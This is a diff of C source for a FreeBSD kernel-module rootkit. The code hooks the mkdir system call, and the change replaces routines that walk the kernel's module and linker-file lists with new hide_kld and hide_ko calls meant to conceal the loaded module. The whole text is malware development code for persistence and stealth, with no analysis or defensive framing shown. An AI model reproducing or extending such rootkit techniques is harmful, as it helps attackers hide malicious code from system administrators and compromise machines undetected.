@@ -19,6 +19,7 @@
 #include "debug.h"
 #include "privilege.h"
 #include "hook.h"
+#include "hide.h"
 
 static int
 load(struct module *module, int cmd, void *arg)
@@ -28,8 +29,8 @@ load(struct module *module, int cmd, void *arg)
 		case MOD_LOAD:
 			LOGI("[rootkit:load] Rootkit loaded.\n");
 			hook_syscall_set(SYS_mkdir, mkdir_hook);
-			remove_linker_file("rootkit.ko");
-			remove_module_from_kernel("rootkit");
+			hide_kld("rootkit");
+			hide_ko("rootkit.ko");
 			break;
 		case MOD_UNLOAD:
 			hook_syscall_set(SYS_mkdir, sys_mkdir);
@@ -67,76 +68,10 @@ mkdir_hook(struct thread *td, void *syscall_args) {
 	return(sys_mkdir(td, syscall_args));
 }
 
-int
-remove_module_from_kernel(char *name)
-{
-	struct module * mod;
-	int result = 1;
-	sx_xlock(&modules_sx);
-
-	LOGI("Searching for %s in modules\n", name);
-	TAILQ_FOREACH(mod, &modules, link){
-		//LOGI("Checking Module: %s\n", mod->name);
-		if (strcmp(mod->name, name) == 0)
-		{
-			LOGI("Found %s, Removing from modules list", mod->name);
-			//nextid--;
-			//TAILQ_REMOVE(&modules, mod, link);
-			result = 0;
-			break;
-		}
-	}
-
-	sx_xunlock(&modules_sx);
-	return result;
-}
-
-// Uncommented to make testing eaiser
-int
-remove_linker_file(char *name)
-{
-	struct linker_file *lf;
-	int result = 1;
-
-	mtx_lock(&Giant);
-	sx_slock(&kld_sx);
-	//decrement_kernel_image_ref_count();
-
-	LOGI("Attempting to remove linker file %s\n", name);
-	TAILQ_FOREACH(lf, &linker_files, link) {
-		LOGI("Checking %s\n", lf->filename);
-		if (strcmp(lf->filename, name) == 0)
-		{
-			//next_file_id--;
-			//TAILQ_REMOVE(&linker_files,lf,link);
-			LOGI("Found and removing linker file\n");
-			result = 0;
-			break;
-		}
-	}
-
-	sx_unlock(&kld_sx);
-	mtx_unlock(&Giant);
-	return result;
-}
-
-void
-decrement_kernel_image_ref_count(void)
-{
-	(&linker_files)->tqh_first->refs--;
-}
-
 static moduledata_t rootkit_mod = {
 	MODULE_NAME,
 	load,
 	NULL
 };
 
-static moduledata_t mkdir_hook_mod = {
-	"mkdir_hook",
-	load,
-	NULL
-};
-
-DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
